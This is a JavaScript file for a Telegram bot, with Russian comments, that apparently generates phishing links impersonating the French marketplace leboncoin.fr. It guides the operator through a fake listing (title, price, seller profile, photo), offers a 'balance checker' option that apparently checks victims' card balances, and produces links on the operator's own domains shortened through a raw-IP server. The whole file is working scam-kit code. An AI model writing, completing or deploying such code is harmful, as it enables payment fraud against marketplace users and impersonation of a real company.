const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, Profiles, MyDomains } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const myAd = require("../../commands/myAd");
const downloadImage = require("../../helpers/downloadImage");

const scene = new WizardScene(
  "create_link_leboncoin_fr",
  // Шаг 0: Выбор версии
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "leboncoin_fr",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.scene.state.data = {};
      log(ctx, "перешёл к созданию ссылки LEBONCOIN.FR");
      
      await ctx.scene.reply("Выберите версию объявления", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Версия 1.0", "v1.0")],
          [Markup.callbackButton("Версия 2.0", "v2.0")],
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  // Шаг 1: Обработка выбора версии
// Шаг 1: Обработка выбора версии
async (ctx) => {
  try {
    const version = ctx.callbackQuery?.data || ctx.message?.text;

    if (!["v1.0", "v2.0"].includes(version)) {
      await ctx.scene.reply("❌ Пожалуйста, выберите версию объявления", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Версия 1.0", "v1.0")],
          [Markup.callbackButton("Версия 2.0", "v2.0")],
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      }).catch((err) => err);
      return;
    }

    ctx.scene.state.data.version = version;

    await ctx.scene.reply("Введите название объявления", {
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("Отменить", "cancel")],
      ]),
    });
    return ctx.wizard.next();
  } catch (err) {
    ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    return ctx.scene.leave();
  }
},

  // Шаг 2: Ввод названия
  async (ctx) => {
    try {
      if (!ctx.message.text) return ctx.wizard.prevStep();

      ctx.scene.state.data.title = escapeHTML(ctx.message.text);
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  // Шаг 3: Ввод цены
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите цену объявления (только число, в EUR)", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  // Шаг 4: Обработка цены
  async (ctx) => {
    try {
      var amount = parseFloat(ctx.message.text);
      if (isNaN(amount)) return ctx.wizard.prevStep();
      if (amount % 1 == 0) amount = amount.toFixed(0);
      else amount = amount.toFixed(2);

      amount = amount + " €";

      ctx.scene.state.data.price = amount;

      // Проверяем версию - если 1.0, сразу переходим к шагу загрузки фото
      if (ctx.scene.state.data.version === "v1.0") {
        return ctx.wizard.chooseStep(7); // Переходим сразу к шагу 7 (загрузка фото)
      }

      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  // Шаг 5: Выбор профиля (только для версии 2.0)
  async (ctx) => {
    try {
      // Если версия 1.0, пропускаем этот шаг
      if (ctx.scene.state.data.version === "v1.0") {
        return ctx.wizard.nextStep();
      }

      const profiles = await Profiles.findAll({
        where: { userId: ctx.from.id },
      });

      var buttons = profiles.map((v) => [Markup.callbackButton(v.title, v.id)]);

      await ctx.scene.reply(`Выберите профиль`, {
        reply_markup: Markup.inlineKeyboard([
          ...buttons,
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  // Шаг 6: Обработка выбора профиля (только для версии 2.0)
  async (ctx) => {
    try {
      // Если версия 1.0, пропускаем этот шаг
      if (ctx.scene.state.data.version === "v1.0") {
        return ctx.wizard.nextStep();
      }

      const profiles = await Profiles.findOne({
        where: { id: ctx.callbackQuery.data },
      });

      ctx.scene.state.data.address = profiles.address;
      ctx.scene.state.data.name = profiles.name;
      ctx.scene.state.data.phone = profiles.phone;
      
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  // Шаг 7: Загрузка фото
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Отправьте изображение в сжатом формате", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Пропустить", "skip")],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  // Шаг 8: Обработка фото
  async (ctx) => {
    try {
      if (ctx.message?.photo?.length < 1 && ctx.callbackQuery?.data !== "skip")
        return ctx.wizard.prevStep();
      if (ctx.callbackQuery?.data == "skip") return ctx.wizard.nextStep();
      const photo_link = await ctx.telegram.getFileLink(
        ctx.message.photo[1].file_id
      );
      ctx.wizard.state.data.photo = await downloadImage(photo_link);
      return ctx.wizard.nextStep();
    } catch (err) {
      if (ctx.message.text) return ctx.wizard.prevStep();

      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  // Шаг 9: Чекер баланса
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  // Шаг 10: Обработка чекера баланса
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery.data))
        return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  // Шаг 11: Финальный шаг - создание объявления
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "leboncoin_fr",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      
      // Для версии 1.0 не используем данные профиля
      let adData = {
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        title: ctx.scene.state.data.title,
        price: ctx.scene.state.data.price,
        balanceChecker: ctx.scene.state.data.balanceChecker,
        serviceCode: "leboncoin_fr",
        version: ctx.scene.state.data.version === "v1.0" ? 1 : 2,
      };

      // Добавляем фото если есть
      if (ctx.scene.state.data.photo) {
        adData.photo = ctx.scene.state.data.photo;
      }

      // Для версии 2.0 добавляем данные профиля
      if (ctx.scene.state.data.version === "v2.0") {
        adData.address = ctx.scene.state.data.address;
        adData.name = ctx.scene.state.data.name;
        adData.phone = ctx.scene.state.data.phone;
      }

      const ad = await Ad.create(adData);

      const domains = await MyDomains.findOne({
        where: { userId: ctx.from.id },
      });

      let reductionUrl;

      try {
        const reduction = await axios.post(
          "http://185.208.158.144/api/create",
          {
            target: `https://${service.domain}/${ad.id}`,
            domain: service.shortlink || ctx.state.bot.shortlink,
          },
          { timeout: 2000 }
        );

        reductionUrl = reduction.data.url;
      } catch (error) {
        console.error("Ошибка при создании сокращенной ссылки:", error.message);

        if (error.code === 'ECONNABORTED') {
          console.warn("Запрос превысил допустимый тайм-аут.");
        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') {
          console.warn("Сервер сокращений недоступен.");
        } else {
          console.warn("Произошла непредвиденная ошибка:", error.message);
        }

        reductionUrl = null; // корректный fallback 
      }

      const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null;

      await ad.update({
        myDomainLink: personalDomainLink,
        shortLink: reductionUrl, // используем переменную 
      });

      log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code> версия ${ctx.scene.state.data.version}`);

      // Собираем сообщение 
      try {
        await myAd(ctx, ad.id);
      } catch (err) {
        await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => { });
      }
      ctx.updateType = "message";
      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
    }
  }
);

module.exports = scene;